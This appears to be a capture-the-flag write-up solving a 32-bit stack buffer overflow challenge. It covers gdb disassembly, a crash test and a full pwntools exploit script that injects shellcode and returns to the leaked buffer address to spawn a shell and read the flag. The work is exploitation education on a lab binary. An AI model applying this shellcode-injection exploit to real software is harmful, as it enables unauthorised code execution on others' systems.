# Analysis
The basic structure of the `stack-ovfl-sc-32` binary in terms of function calls is:
`main` -> `non_main_func` -> `input_func` -> `read`

Based on this, we can take a closer look at `input_func`:
```gdb
...
0x00001241 <+81>:    lea    -0x84(%ebp),%eax
0x00001247 <+87>:    xor    %ecx,%ecx
0x00001249 <+89>:    movl   $0x0,(%esp)
0x00001250 <+96>:    mov    %eax,0x4(%esp)
0x00001254 <+100>:   movl   $0x100,0x8(%esp)
0x0000125c <+108>:   call   0x1050 <read@plt>
...
```

From this, we know that the buffer is at `%ebp-0x84` and that we can read in `0x100` bytes of data. In theory, this means we can directly overwrite the 
return address. We can test this by trying with random data.

```
$ ./stack-ovfl-sc-32
Your buffer is at: 0xffffc454
Please type your name:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Segmentation fault (core dumped)
```

This suggests that the return address can be overwritten, which makes inserting our shellcode very easy. We just need to overwrite the return address with the
address of the buffer and structure the buffer so that it equals `<shellcode> + <padding> + <buffer_addr>`. To start, it's particularly easy to get the buffer address
because it's printed out for us and we can read that line into our script. 

```py
#!/usr/bin/python3

from pwn import *

p = process('./stack-ovfl-sc-32')

line = p.recvline()
addr = int(line.split(b':')[-1].strip(), 16)
```

For the shellcode itself, we can reuse the shellcode from `nonzero-shellcode-32` (details found [here](./shellcode/writing-shellcode.md#nonzero-shellcode-32)).

```py
file = open("./shellcode.bin', 'rb')
shellcode = file.read()
```

Now we can build the final string:
```py
string = string = shellcode + b'a' * (0x84 - len(shellcode)) + b'_EBP' + p32(addr)
```

# Full Script + Solving
```py
#!/usr/bin/python3

from pwn import *

p = process('./stack-ovfl-sc-32')

file = open('./shellcode.bin', 'rb')
shellcode = file.read()

line = p.recvline()
addr = int(line.split(b':')[-1].strip(), 16)

string = shellcode + b'a' * (0x84 - len(shellcode)) + b'_EBP' + p32(addr)

p.sendline(string)
p.interactive()
```

```
$ ./p.py
[+] Starting local process './stack-ovfl-sc-32': pid 1446811
[*] Switching to interactive mode
Please type your name:
Hello j2X̀\x89É\xc1jGX̀1\xc0P\x89\xc1\x89\xc2hn/shh//bij\x0bX\x89\xe3̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa_EBPd\xc4\xff\xff

$ groups
stack-ovfl-sc-32 sawyeras
$ cat flag
cand{Put_y0ur_sh3llc0de_0n_th3_St4ck}
```
